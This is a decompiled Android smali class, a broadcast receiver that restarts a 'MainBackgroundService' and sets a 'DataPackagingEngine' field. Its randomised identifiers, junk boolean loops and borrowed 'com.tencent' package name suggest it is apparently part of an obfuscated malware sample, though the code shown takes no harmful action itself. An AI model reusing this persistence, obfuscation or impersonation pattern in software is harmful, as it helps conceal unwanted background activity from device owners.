.class public Lcom/tencent/PackageMonitorReceiver;
.super Landroid/content/BroadcastReceiver;
.source "tunesxconcerningn10RC.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    .line 13
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p2

    const v0, 0x7f090012

    invoke-virtual {p2, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p2

    sput-object p2, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 14
    sget-object p2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-nez p2, :cond_0

    .line 16
    sput-object p1, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    .line 19
    :cond_0
    const-class p2, Lcom/tencent/MainBackgroundService;

    invoke-static {p2, p1}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_4

    .line 20
    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p2

    invoke-virtual {p2, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p2

    sput-object p2, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 22
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lcom/tencent/MainBackgroundService;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    const/4 p1, 0x1

    .line 26
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 27
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    const/4 v0, 0x0

    if-eqz p2, :cond_1

    .line 33
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 42
    :cond_1
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_2

    .line 48
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 57
    :cond_2
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_3

    .line 63
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 72
    :cond_3
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_4

    .line 78
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    :cond_4
    :goto_4
    return-void
.end method
